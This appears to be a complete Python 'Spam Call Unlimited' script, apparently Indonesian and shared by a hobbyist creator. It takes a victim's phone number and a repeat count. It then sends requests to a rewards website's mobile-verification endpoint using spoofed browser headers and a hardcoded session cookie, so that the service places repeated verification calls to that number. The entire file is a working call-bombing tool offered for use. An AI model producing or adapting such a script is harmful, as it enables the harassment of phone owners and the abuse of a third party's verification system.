try:
	import time,sys,os,json,requests,random
	from time import sleep
except ModuleNotFoundError:
	exit('$ pip install requests')
ua=random.choice(['Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'])
data={'Host': 'id.jagreward.com','Connection': 'keep-alive','Accept': '*/*','X-Requested-With': 'XMLHttpRequest','Save-Data': 'on','User-Agent': ua,'Sec-Fetch-Site': 'same-origin','Sec-Fetch-Mode': 'cors','Sec-Fetch-Dest': 'empty','Referer': 'https://id.jagreward.com/member/register/','Accept-Encoding': 'gzip, deflate, br','Accept-Language': 'id-ID,id;q=0.9,en;q=0.8','Cookie': 'PHPSESSID=p8h80oleoevr9do7bor33t88up; _ga=GA1.3.1941571285.1641075863; DAPROPS="sjs.webGlRenderer:Adreno (TM) 505|bjs.accessDom:1|bcookieSupport:1|bcss.animations:1|bcss.columns:1|bcss.transforms:1|bcss.transitions:1|sdevicePixelRatio:1.6687500476837158|idisplayColorDepth:24|bflashCapable:0|bhtml.audio:1|bhtml.canvas:1|bhtml.inlinesvg:1|bhtml.svg:1|bhtml.video:1|bjs.applicationCache:0|bjs.deviceMotion:1|bjs.deviceOrientation:0|bjs.geoLocation:1|bjs.indexedDB:1|bjs.json:1|bjs.localStorage:1|bjs.modifyCss:1|bjs.modifyDom:1|bjs.querySelector:1|bjs.sessionStorage:1|bjs.supportBasicJavaScript:1|bjs.supportConsoleLog:1|bjs.supportEventListener:1|bjs.supportEvents:1|bjs.touchEvents:1|bjs.webGl:1|bjs.webSockets:1|bjs.webSqlDatabase:1|bjs.webWorkers:1|bjs.xhr:1|iorientation:0|buserMedia:1|bjs.battery:0"; _gid=GA1.3.1018949519.1646998248'}
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU.
K = '\x1b[1;93m' # KUNING.
B = '\x1b[1;94m' # BIRU.
U = '\x1b[1;95m' # UNGU.
O = '\x1b[1;96m' # BIRU MUDA.
N = '\x1b[0m'	# WARNA MATI

def logo():
	os.system('clear')
	print(U+"""
  _______       __ __ 
 |   _   .---.-|  |  | """+M+"""© """+P+"""Creator """+M+""": """+P+"""Xenzi Ganzz
"""+U+""" |.  1___|  _  |  |  | """+K+"""® """+P+"""YouTube """+M+""": """+P+"""XENZI GANZ
"""+U+""" |.  |___|___._|__|__| """+H+"""@ """+P+"""Github  """+M+""": """+H+"""https://github.com/Xenzi-XN1
"""+U+""" |:  1   |            
"""+U+""" |::.. . | """+P+"""[ """+H+"""ONLINE """+P+"""]  """+P+""" [ """+K+"""Spam Call Unlimited """+P+"""| """+H+"""Version 2.0 """+P+"""]
"""+U+""" `-------' """)

def main():
	logo()
	print('%s[%s#%s] %sExample %s: %s8xxxxx' % (P,K,P,P,M,H))
	nomor = input('%s[%s?%s] %sNomor%s:%s ' % (P,K,P,P,M,H))
	if nomor in[""]:
		exit('\n%s[%s!%s] %sJanggan Kosong' % (P,M,P,P))
	jum = int(input('%s[%s+%s] %sJumlah %s:%s ' % (P,H,P,P,H)))
	if jum > 5:
		exit('\n%s[%s!%s] %sJumlah Terlalu Banyak' % (P,M,P,P))
	elif jum in[""]:
		exit('\n%s[%s!%s] %sJanggan Kosong' % (P,M,P,P))
	else:
		print()
		for i in range(int(jum)):
			Subscribe = requests.get('https://id.jagreward.com/member/verify-mobile/'+nomor+'/',headers=data).text
			if "Anda akan menerima sebuah panggilan dari sistem kami. Silakan isi 6 ANGKA TERAKHIR dari nomor telepon dibawah ini." in Subscribe:
				print("%s[%s✓%s] %sBerhasil Mengirimkan Spam Call" % (P,H,P,P))
			else:
				print("%s[%sX%s] %sGagal Mengirimkan Spam Call" % (P,M,P,P))
		print ('\n%s[%s✓%s] %sSelesai' % (P,H,P,P))
main()
